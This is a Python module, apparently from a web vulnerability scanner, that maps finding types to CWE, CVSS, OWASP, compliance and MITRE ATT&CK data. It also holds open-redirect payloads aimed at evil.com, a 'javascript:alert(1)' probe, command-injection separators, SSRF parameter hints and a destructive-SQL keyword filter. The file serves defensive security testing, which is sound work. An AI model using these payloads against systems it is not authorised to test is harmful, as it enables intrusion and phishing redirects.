    },
    "Self-Signed Certificate": {
        "cwe": "CWE-295",
        "cvss": 7.4,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "description": "Self-signed SSL certificate with no trusted CA chain. Browsers will show untrusted certificate warnings, enabling MITM attacks.",
        "recommendation": "Replace self-signed certificate with one from a trusted Certificate Authority (Let's Encrypt, DigiCert, etc.).",
        "owasp": "A02:2021 – Cryptographic Failures",
    },
    
    # ── Cookie Security ──────────────────────────────────────────────────────
    "Cookie Security – Missing Secure Flag": {
        "cwe": "CWE-614",
        "cvss": 5.9,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "description": "Session cookie is transmitted without the Secure flag, allowing it to be sent over unencrypted HTTP connections and intercepted by network attackers.",
        "recommendation": "Add Secure flag to all cookies: Set-Cookie: SESSIONID=xxx; Secure; HttpOnly; SameSite=Strict",
        "owasp": "A02:2021 – Cryptographic Failures",
    },
    "Cookie Security – Missing HttpOnly Flag": {
        "cwe": "CWE-1004",
        "cvss": 4.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
        "description": "Cookie lacks HttpOnly flag, allowing JavaScript to access the cookie value and enabling XSS-based session theft.",
        "recommendation": "Add HttpOnly flag to session cookies: Set-Cookie: SESSIONID=xxx; HttpOnly",
        "owasp": "A07:2021 – Identification and Authentication Failures",
    },
    "Cookie Security – Missing SameSite Attribute": {
        "cwe": "CWE-1275",
        "cvss": 4.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
        "description": "Cookie lacks the SameSite attribute, allowing it to be sent in cross-site requests and enabling CSRF attacks.",
        "recommendation": "Set SameSite=Strict or SameSite=Lax on all session cookies.",
        "owasp": "A01:2021 – Broken Access Control",
    },
    "Persistent Session Cookie": {
        "cwe": "CWE-613",
        "cvss": 3.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
        "description": "Session cookie has a long expiration time (Max-Age/Expires), increasing the window for session hijacking.",
        "recommendation": "Use session cookies that expire when the browser closes. If persistence is required, use short expiration times and implement session rotation.",
        "owasp": "A07:2021 – Identification and Authentication Failures",
    },
    
    # ── Directory/Path Exposure ──────────────────────────────────────────────
    "Exposed Path / File": {
        "cwe": "CWE-538",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "description": "Sensitive files or directories are accessible or confirmed to exist on the server. Even restricted paths (HTTP 403) reveal the presence of sensitive resources.",
        "recommendation": "Remove unnecessary files from web root. Configure server to return 404 for sensitive paths. Implement proper access controls.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    
    # ── WAF Detection ────────────────────────────────────────────────────────
    "WAF Detected": {
        "cwe": "N/A",
        "cvss": 0.0,
        "cvss_vector": "N/A",
        "description": "A Web Application Firewall (WAF) was detected protecting this target. This is a positive security control. AlanScan automatically switched to WAF bypass payload variants.",
        "recommendation": "WAF presence is a positive security control. Ensure WAF rules are kept up to date and regularly audited. Test WAF bypass techniques during assessments.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    "WAF Status — No WAF Detected": {
        "cwe": "N/A",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "description": "No Web Application Firewall (WAF) was detected in front of this target. The application is exposed directly to the internet with no automated request-filtering layer. This increases the exploitability and potential impact of all other findings in this report.",
        "recommendation": "Deploy a WAF (e.g., Cloudflare, AWS WAF, ModSecurity) in front of the application. Configure rules for OWASP Top 10 attack patterns. A WAF does not replace secure coding but provides an additional detection and mitigation layer.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    "API Exposure — Swagger UI Publicly Accessible": {
        "cwe": "CWE-200",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "description": "Swagger/OpenAPI UI is publicly accessible and discloses API structure, parameters, and endpoint behavior to unauthenticated users.",
        "recommendation": "Restrict Swagger UI and OpenAPI schemas to authenticated users or internal networks. Disable in production when not required.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    "API Exposure": {
        "cwe": "CWE-200",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "description": "Publicly exposed API documentation or metadata increases attack surface visibility for unauthenticated users.",
        "recommendation": "Restrict documentation endpoints and remove sensitive API metadata from public responses.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    
    # ── Information Disclosure ───────────────────────────────────────────────
    "Information Disclosure (Header)": {
        "cwe": "CWE-200",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "description": "Server response headers reveal software name and version information. This intelligence assists attackers in identifying known vulnerabilities for the disclosed technology.",
        "recommendation": "Remove or suppress Server, X-Powered-By, and X-AspNet-Version headers. Configure server to not disclose version information.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    
    # ── Open Ports ───────────────────────────────────────────────────────────
    "Open Port": {
        "cwe": "CWE-16",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "description": "Network port is open and accessible. This expands the attack surface and may expose vulnerable services.",
        "recommendation": "Close unnecessary ports. Implement firewall rules to restrict access. Keep services patched and up to date.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    
    # ── Service Banner ───────────────────────────────────────────────────────
    "Service Banner": {
        "cwe": "CWE-200",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "description": "Service banner reveals software version and configuration information that can be used to identify known vulnerabilities.",
        "recommendation": "Configure services to hide or obfuscate version information. Keep services updated to the latest versions.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    "Default Credentials Accepted": {
        "cwe": "CWE-798",
        "cvss": 9.8,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "description": "The application accepted a default or weak credential pair, enabling unauthorized administrative or user access.",
        "recommendation": "Remove default credentials immediately, enforce strong password policy, and enable MFA for privileged accounts.",
        "owasp": "A07:2021 – Identification and Authentication Failures",
    },
    "Username Enumeration via Login Responses": {
        "cwe": "CWE-204",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "description": "Login responses differ between invalid usernames and valid usernames with wrong passwords, allowing attackers to enumerate accounts.",
        "recommendation": "Return uniform error messages and response patterns for all failed authentication attempts.",
        "owasp": "A07:2021 – Identification and Authentication Failures",
    },
    
    # ── CVE Match ────────────────────────────────────────────────────────────
    "CVE Match (Banner-Based)": {
        "cwe": "CWE-1104",
        "cvss": 8.0,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "description": "Service banner matches a known vulnerable version with a public CVE. This vulnerability has a known exploit that can be used to compromise the system.",
        "recommendation": "Patch or upgrade the affected service immediately. If patching is not possible, implement compensating controls or isolate the service.",
        "owasp": "A06:2021 – Vulnerable and Outdated Components",
    },
    
    # ── Plaintext HTTP ───────────────────────────────────────────────────────
    "Plaintext HTTP – No Encryption": {
        "cwe": "CWE-319",
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "description": "The application is served over unencrypted HTTP. All data including passwords, session tokens, and personal information is transmitted in plaintext and can be intercepted.",
        "recommendation": "Implement HTTPS using a valid TLS certificate. Redirect all HTTP traffic to HTTPS. Add HSTS header to prevent downgrade attacks.",
        "owasp": "A02:2021 – Cryptographic Failures",
    },
}

def apply_intensity_payload_cap(payloads: list, intensity: str) -> list:
    """
    Trim payload lists for LIGHT/MEDIUM scans. AGGRESSIVE uses the full list.
    """
    if not payloads:
        return []
    intensity = (intensity or SCAN_INTENSITY_DEFAULT).lower()
    if intensity not in ("light", "medium", "aggressive"):
        intensity = SCAN_INTENSITY_DEFAULT
    n = len(payloads)
    if intensity == "aggressive":
        return list(payloads)
    if intensity == "light":
        cap = max(8, min(n, 14))
        return list(payloads[:cap])
    # medium
    cap = max(22, min(n, n // 2 + 20))
    return list(payloads[:cap])


def sql_payloads_skip_destructive(payloads: list) -> list:
    """Remove obviously destructive probes (safe / LIGHT scans)."""
    bad = ("DROP TABLE", "DROP ", "INSERT INTO", "DELETE FROM", "TRUNCATE ")
    out = []
    for p in payloads:
        u = str(p).upper()
        if any(b in u for b in bad):
            continue
        out.append(p)
    return out if out else list(payloads)


def get_vuln_meta(finding_type: str) -> dict:
    """Return metadata for a finding type — fallback to generic if not found."""
    # Try exact match first
    if finding_type in VULN_METADATA:
        return VULN_METADATA[finding_type]
    # Try partial match
    for key in VULN_METADATA:
        if key.lower() in finding_type.lower() or finding_type.lower() in key.lower():
            return VULN_METADATA[key]
    # Generic fallback
    return {
        "cwe": "CWE-unknown",
        "cvss": 5.0,
        "cvss_vector": "N/A",
        "description": f"{finding_type} — see evidence for details.",
        "recommendation": "Review the finding details and apply appropriate remediation based on the vulnerability type.",
        "owasp": "OWASP Top 10:2021",
    }
    


# ── SSRF Prone Parameter Names (subset — full list in ssrf.py) ────────────────
SSRF_PARAM_HINTS = [
    "url", "uri", "path", "src", "dest", "redirect", "return",
    "link", "href", "resource", "image", "fetch", "host", "callback",
]

# ── Command Injection Separators ──────────────────────────────────────────────
CMDI_SEPARATORS = [";", "|", "||", "&&", "`", "$(", "&"]


# ── Open Redirect Payloads (v3.1.0) ─────────────────────────────────────────
OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%2F",
    "javascript:alert(1)",
]

OPEN_REDIRECT_PARAM_HINTS = [
    "redirect", "return", "next", "url", "goto", "dest", "destination",
    "target", "redir", "redirect_uri", "return_url", "returnUrl",
    "redirectUrl", "next_url", "back", "forward",
]

# ── IDOR Sensitive Parameters (v3.1.0) ───────────────────────────────────────
IDOR_SENSITIVE_PARAMS = [
    "id", "user_id", "account_id", "uid", "userid", "acct", "customer_id",
    "order_id", "invoice_id", "doc_id", "file_id", "record_id",
    "profile_id", "member_id", "pid", "rid",
]

# ── Compliance Framework Mappings (v3.1.0) ───────────────────────────────────
COMPLIANCE_FRAMEWORKS = {
    "PCI-DSS v4.0": {
        "SQL Injection": ["Req 6.2.4", "Req 6.3.2"],
        "XSS":           ["Req 6.2.4"],
        "Weak SSL/TLS":  ["Req 4.2.1"],
        "Open Port":     ["Req 1.3.1"],
        "Default Credentials Accepted": ["Req 8.3.6"],
    },
    "GDPR Art.32": {
        "SQL Injection":  ["Art.32 – Technical measures"],
        "Plaintext HTTP": ["Art.32 – Encryption of personal data"],
        "XSS":            ["Art.32 – Ongoing confidentiality"],
    },
    "HIPAA Security Rule": {
        "SQL Injection":  ["164.312(a)(1)"],
        "Weak SSL/TLS":   ["164.312(e)(2)(ii)"],
        "Missing Security Header": ["164.312(c)(1)"],
    },
    "ISO 27001:2022": {
        "SQL Injection":  ["A.8.28 – Secure coding"],
        "Open Port":      ["A.8.21 – Security of network services"],
        "Weak SSL/TLS":   ["A.8.24 – Use of cryptography"],
        "Default Credentials Accepted": ["A.5.17 – Authentication information"],
    },
}

# ── MITRE ATT&CK Mappings (v3.1.0) ───────────────────────────────────────────
MITRE_ATTACK_MAPPING = {
    "SQL Injection":               {"id": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Reflected XSS":               {"id": "T1189", "name": "Drive-by Compromise",              "tactic": "Initial Access"},
    "CSRF":                        {"id": "T1204",  "name": "User Execution",                   "tactic": "Execution"},
    "Server-Side Request Forgery": {"id": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "OS Command Injection":        {"id": "T1059",  "name": "Command and Scripting Interpreter", "tactic": "Execution"},
    "Local File Inclusion":        {"id": "T1005",  "name": "Data from Local System",           "tactic": "Collection"},
    "XXE Injection":               {"id": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Missing Security Header":     {"id": "T1562",  "name": "Impair Defenses",                  "tactic": "Defense Evasion"},
    "Plaintext HTTP":              {"id": "T1557",  "name": "Adversary-in-the-Middle",           "tactic": "Credential Access"},
    "Weak SSL/TLS":                {"id": "T1573",  "name": "Encrypted Channel",                "tactic": "Command and Control"},
    "Default Credentials":         {"id": "T1078",  "name": "Valid Accounts",                   "tactic": "Initial Access"},
    "Open Port":                   {"id": "T1046",  "name": "Network Service Discovery",         "tactic": "Discovery"},
    "Open Redirect":               {"id": "T1598",  "name": "Phishing for Information",          "tactic": "Reconnaissance"},
    "Potential IDOR":              {"id": "T1087",  "name": "Account Discovery",                "tactic": "Discovery"},
}


def get_compliance_mapping(finding_type: str) -> dict:
    """Return compliance requirements for a given finding type."""
    result = {}
    ft = finding_type.lower()
    for framework, mappings in COMPLIANCE_FRAMEWORKS.items():
        for vuln_key, reqs in mappings.items():
            if vuln_key.lower() in ft or ft in vuln_key.lower():
                result[framework] = reqs
                break
    return result


def get_mitre_mapping(finding_type: str) -> dict:
    ft = finding_type.lower()
    for key, mapping in MITRE_ATTACK_MAPPING.items():
        if key.lower() in ft:
            return mapping
    return {"id": "T1595", "name": "Active Scanning", "tactic": "Reconnaissance"}

# ── Add missing IDOR and Open Redirect entries to VULN_METADATA ──────────────
VULN_METADATA.update({
    "Open Redirect": {
        "cwe": "CWE-601",
        "cvss": 6.1,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "description": "An open redirect vulnerability allows attackers to redirect users to malicious external sites, often used in phishing campaigns to increase victim trust.",
        "recommendation": "Validate redirect destinations against an allowlist. Use relative paths. Display a warning before external redirects.",
        "owasp": "A01:2021 – Broken Access Control",
    },
    "Potential IDOR": {
        "cwe": "CWE-639",
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
        "description": "Insecure Direct Object Reference (IDOR) allows attackers to access or modify resources belonging to other users by manipulating object identifiers without proper authorization checks.",
        "recommendation": "Implement object-level authorization checks on every request. Use indirect references (hashed or randomized IDs). Log and alert on sequential enumeration patterns.",
        "owasp": "A01:2021 – Broken Access Control",
    },
    "API Security — GraphQL Introspection Enabled": {
        "cwe": "CWE-200",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "description": "GraphQL introspection is enabled in production, allowing unauthenticated enumeration of all API types, queries, and mutations.",
        "recommendation": "Disable introspection in production. Restrict to authenticated developers only.",
        "owasp": "A05:2021 – Security Misconfiguration",
    },
    "Rate Limiting — Not Observed (Heuristic)": {
        "cwe": "CWE-307",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "description": "The endpoint did not throttle a rapid burst of requests. On login or OTP endpoints this enables brute-force attacks.",
        "recommendation": "Implement rate limiting (max 5–10 requests/min) on authentication and sensitive endpoints. Use CAPTCHA and account lockout.",
        "owasp": "A07:2021 – Identification and Authentication Failures",
    },
    "Weak Authentication": {
        "cwe": "CWE-521",
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "description": "Authentication mechanism is weak — no lockout policy, no MFA requirement, or predictable tokens detected.",
        "recommendation": "Implement account lockout after 5 failed attempts. Enforce MFA for privileged accounts. Use strong, unpredictable session tokens.",
        "owasp": "A07:2021 – Identification and Authentication Failures",
    },
})
